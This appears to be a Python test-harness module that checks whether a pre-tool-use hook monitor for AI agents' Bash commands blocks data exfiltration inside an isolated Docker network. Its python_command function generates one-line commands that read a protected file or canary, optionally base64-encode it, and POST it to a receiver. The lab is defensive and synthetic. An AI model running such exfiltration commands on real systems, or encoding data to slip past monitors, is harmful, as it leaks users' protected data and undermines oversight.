"""Fixed synthetic HTTP trials on a private, gateway-less Docker bridge.

No arbitrary command interface is exposed. The receiver's observations are
independent of both the sender and ToolUseProxy's decision.
"""

from __future__ import annotations

import ipaddress
import base64
import json
import re
import shlex
import time
import uuid

from .preflight import LABEL, LabError, command, create_argv, document, validate_profile


CANARY = "FLOW_LAB_SYNTHETIC_SOURCE_ONLY"
GATEWAY_OPTION = "com.docker.network.bridge.gateway_mode_ipv4"
MASQUERADE_OPTION = "com.docker.network.bridge.enable_ip_masquerade"

RECEIVER = r"""import base64, json, re
from http.server import BaseHTTPRequestHandler, HTTPServer
CANARY = b'FLOW_LAB_SYNTHETIC_SOURCE_ONLY'
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass
    def setup(self):
        super().setup()
        self.connection.settimeout(2)
    def do_POST(self):
        match = re.fullmatch('/trial/([a-f0-9]{32})', self.path)
        length = self.headers.get('Content-Length', '')
        if not match or not length.isdigit() or not 0 <= int(length) <= 65536:
            self.send_error(400)
            return
        body = self.rfile.read(int(length))
        if len(body) != int(length): return
        encoding = self.headers.get('X-Lab-Encoding', 'plain')
        if encoding == 'base64':
            try: decoded = base64.b64decode(body, validate=True)
            except ValueError: decoded = b''
        else: decoded = body
        print(json.dumps({'kind':'received', 'step_id':match[1],
            'protected':CANARY in decoded, 'body_size':len(body)}), flush=True)
        self.send_response(204)
        self.end_headers()
server = HTTPServer(('0.0.0.0', 8080), Handler)
print(json.dumps({'kind':'ready'}), flush=True)
server.serve_forever()
"""

GUARD = r"""import contextlib, io, json, os, sys
from pathlib import Path
sys.path.insert(0, '/opt/tooluseproxy')
from hook_monitor.runtime.storage import EventStore
from hook_monitor.runtime.workspace import resolve_workspace
from hook_monitor.runtime.runner import run_hook
root = Path('/opt/flow-lab')
db = Path('/work/runtime.sqlite3')
store = EventStore(db)
store.initialize()
workspace = resolve_workspace(str(root), str(root), discovered_by='synthetic_lab')
store.register_workspace(workspace)
initial = store.get_workspace_runtime_settings(workspace.workspace_id)
store.apply_workspace_runtime_settings_profile(workspace, settings={
    'pre-tool-policy':True, 'file-payload-shadow':True,
    'file-payload-exact-enforcement':True, 'externality-protection':True,
    'pilot-recording':False,
}, expected_revision=initial.revision)
os.environ['TOOLUSEPROXY_WORKSPACE_ROOT'] = str(root)
request = json.loads(sys.stdin.buffer.read(65537))
payload = {'session_id':request['session_id'], 'turn_id':request['step_id'],
    'tool_use_id':request['step_id'], 'tool_name':'Bash', 'cwd':str(root),
    'tool_input':{'command':request['command']}}
sys.stdin = type('Input', (), {'buffer':io.BytesIO(json.dumps(payload).encode())})()
out = io.StringIO()
with contextlib.redirect_stdout(out):
    result = run_hook('pre_tool_use', db_path=db, allow_schema_migration=False,
        activated_workspace_root=str(root))
value = json.loads(out.getvalue()) if out.getvalue().strip() else {}
details = value.get('hookSpecificOutput', {})
decision = details.get('permissionDecision', 'allow')
import sqlite3
with sqlite3.connect(db) as connection:
    receipt = connection.execute('SELECT COUNT(*) FROM events WHERE tool_use_id=?',
        (request['step_id'],)).fetchone()[0]
print(json.dumps({'decision':decision, 'receipt_count':receipt, 'exit_code':result}))
"""


def validate_network(value: object, name: str) -> None:
    if not re.fullmatch(r"tup-lab-net-[a-f0-9]{32}", name):
        raise LabError("invalid_network_identity")
    if not isinstance(value, dict):
        raise LabError("invalid_network_response")
    if not isinstance(value.get("Labels"), dict) or not isinstance(value.get("Options"), dict):
        raise LabError("invalid_network_response")
    if (
        value.get("Name") != name or value.get("Driver") != "bridge"
        or value.get("Internal") is not True or value.get("EnableIPv6") is not False
        or value.get("Ingress") is not False or value.get("Labels", {}).get(LABEL) != "true"
        or value.get("Options", {}).get(GATEWAY_OPTION) != "isolated"
        or value.get("Options", {}).get(MASQUERADE_OPTION) != "false"
    ):
        raise LabError("unsafe_network_profile")


def python_command(address: str, step_id: str, *, source: str, encoding: str = "plain") -> str:
    """Generate the exact command evaluated by the guard and executed by the sender."""
    if not ipaddress.ip_address(address).is_private or not re.fullmatch(r"[a-f0-9]{32}", step_id):
        raise LabError("invalid_receiver_identity")
    if source not in {"public", "protected", "file"} or encoding not in {"plain", "base64"}:
        raise LabError("invalid_scenario")
    expression = {
        "public": "b'FLOW_LAB_PUBLIC_TEXT'",
        "protected": repr(CANARY.encode()),
        "file": "Path('/opt/flow-lab/protected.txt').read_bytes().strip()",
    }[source]
    if encoding == "base64" and source != "file":
        expression = repr(base64.b64encode(
            b"FLOW_LAB_PUBLIC_TEXT" if source == "public" else CANARY.encode()
        ))
    script = (
        "import urllib.request,base64; from pathlib import Path; "
        f"payload={expression}; "
        + ("payload=base64.b64encode(payload); " if encoding == "base64" and source == "file" else "")
        + f"request=urllib.request.Request('http://{address}:8080/trial/{step_id}', "
        + f"data=payload, headers={{'X-Lab-Encoding':{encoding!r}}}, method='POST'); "
        + "urllib.request.urlopen(request,timeout=2).read()"
    )
    return "python -I -B -c " + shlex.quote(script)


class FixedTransport:
    def __init__(self, image_id: str):
        self.image_id = image_id
        self.network = "tup-lab-net-" + uuid.uuid4().hex
        self.receiver = "tup-lab-" + uuid.uuid4().hex
        self.owned: list[str] = []
        self.network_created = False
        self.address: str | None = None
        self.prepared: dict[str, str] = {}

    def __enter__(self):
        try:
            command([
                "docker", "network", "create", "--driver", "bridge", "--internal",
                "--ipv6=false", "--label", f"{LABEL}=true",
                "--opt", f"{GATEWAY_OPTION}=isolated",
                "--opt", f"{MASQUERADE_OPTION}=false", self.network,
            ])
            self.network_created = True
            self.check_network()
            self._create(self.receiver, RECEIVER, network=self.network)
            command(["docker", "start", self.receiver])
            for _ in range(30):
                if {"kind": "ready"} in self.records():
                    break
                time.sleep(0.1)
            else:
                raise LabError("receiver_not_ready")
            info = self.inspect(self.receiver, network=self.network)
            address = info["NetworkSettings"]["Networks"][self.network]["IPAddress"]
            if not ipaddress.ip_address(address).is_private:
                raise LabError("invalid_receiver_identity")
            self.address = address
            return self
        except Exception:
            self.close()
            raise

    def __exit__(self, *_):
        self.close()

    def check_network(self) -> None:
        info = document(["docker", "network", "inspect", self.network])
        if not isinstance(info, list) or len(info) != 1:
            raise LabError("invalid_network_response")
        validate_network(info[0], self.network)
        names = {
            item.get("Name") for item in info[0].get("Containers", {}).values()
        }
        if not names <= set(self.owned):
            raise LabError("unexpected_network_member")

    def inspect(self, name: str, *, network: str) -> dict:
        info = document(["docker", "inspect", name])
        if not isinstance(info, list) or len(info) != 1:
            raise LabError("invalid_container_response")
        validate_profile(info[0], self.image_id, network=network)
        if set(info[0].get("NetworkSettings", {}).get("Networks", {})) != {network}:
            raise LabError("unexpected_container_network")
        return info[0]

    def _create(self, name: str, script: str, *, network: str, interactive: bool = False) -> None:
        argv = create_argv(self.image_id, name)
        argv[argv.index("--network") + 1] = network
        argv[-1] = script
        if interactive:
            argv.insert(2, "--interactive")
        command(argv)
        self.owned.append(name)
        self.inspect(name, network=network)

    def guard(self, cmd: str, *, session_id: str, step_id: str) -> str:
        if self.prepared.get(step_id) != cmd or not re.fullmatch(r"[a-f0-9]{32}", session_id):
            raise LabError("unprepared_fixed_command")
        name = "tup-lab-" + uuid.uuid4().hex
        self._create(name, GUARD, network="none", interactive=True)
        raw = command(["docker", "start", "--attach", "--interactive", name], data=json.dumps({
            "command": cmd, "session_id": session_id, "step_id": step_id,
        }).encode(), timeout=10)
        try:
            value = json.loads(raw)
        except (ValueError, UnicodeError) as exc:
            raise LabError("invalid_guard_result") from exc
        if (
            not isinstance(value, dict) or value.get("decision") not in {"allow", "deny"}
            or value.get("exit_code") != 0 or value.get("receipt_count") != 1
        ):
            raise LabError("guard_receipt_missing")
        self.inspect(name, network="none")
        return value["decision"]

    def prepare(self, step_id: str, *, source: str, encoding: str = "plain") -> str:
        if self.address is None or step_id in self.prepared:
            raise LabError("invalid_scenario_state")
        cmd = python_command(self.address, step_id, source=source, encoding=encoding)
        self.prepared[step_id] = cmd
        return cmd

    def send(self, cmd: str, *, disconnected: bool = False) -> bool:
        """Only the exact fixed Python command generated by this module is accepted."""
        if cmd not in self.prepared.values():
            raise LabError("unprepared_fixed_command")
        parts = shlex.split(cmd)
        if len(parts) != 5 or parts[:4] != ["python", "-I", "-B", "-c"]:
            raise LabError("invalid_fixed_command")
        # No public arbitrary-command API: caller must compare with its generated scenario.
        name = "tup-lab-" + uuid.uuid4().hex
        network = "none" if disconnected else self.network
        self._create(name, parts[4], network=network)
        self.check_network()
        try:
            command(["docker", "start", "--attach", name], timeout=5)
        except LabError:
            state = self.inspect(name, network=network).get("State", {})
            if state.get("Running"):
                raise
            return False
        state = self.inspect(name, network=network).get("State", {})
        if state.get("Running") or state.get("Status") != "exited":
            raise LabError("sender_completion_unknown")
        return type(state.get("ExitCode")) is int and state["ExitCode"] == 0

    def records(self) -> list[dict]:
        raw = command(["docker", "logs", self.receiver])
        try:
            records = [json.loads(line) for line in raw.splitlines()]
        except (ValueError, UnicodeError) as exc:
            raise LabError("invalid_receiver_record") from exc
        for item in records:
            if item == {"kind": "ready"}:
                continue
            if (
                not isinstance(item, dict)
                or set(item) != {"kind", "step_id", "protected", "body_size"}
                or item["kind"] != "received"
                or not isinstance(item["step_id"], str)
                or not re.fullmatch(r"[a-f0-9]{32}", item["step_id"])
                or type(item["protected"]) is not bool
                or type(item["body_size"]) is not int
                or not 0 <= item["body_size"] <= 65536
            ):
                raise LabError("invalid_receiver_record")
        return records

    def delivery(self, step_id: str) -> tuple[str, str]:
        if not self.inspect(self.receiver, network=self.network).get("State", {}).get("Running"):
            return "unknown", "unknown"
        matching = [item for item in self.records() if item.get("step_id") == step_id]
        if len(matching) > 1:
            raise LabError("duplicate_receiver_record")
        if not matching:
            return "no", "no"
        return "yes", "yes" if matching[0]["protected"] else "no"

    def close(self) -> None:
        failures = []
        for name in reversed(self.owned):
            try:
                command(["docker", "rm", "--force", name], timeout=10)
            except LabError:
                failures.append(name)
        self.owned = failures
        if self.network_created and not failures:
            command(["docker", "network", "rm", self.network], timeout=10)
            self.network_created = False
        if failures:
            raise LabError("lab_cleanup_incomplete")
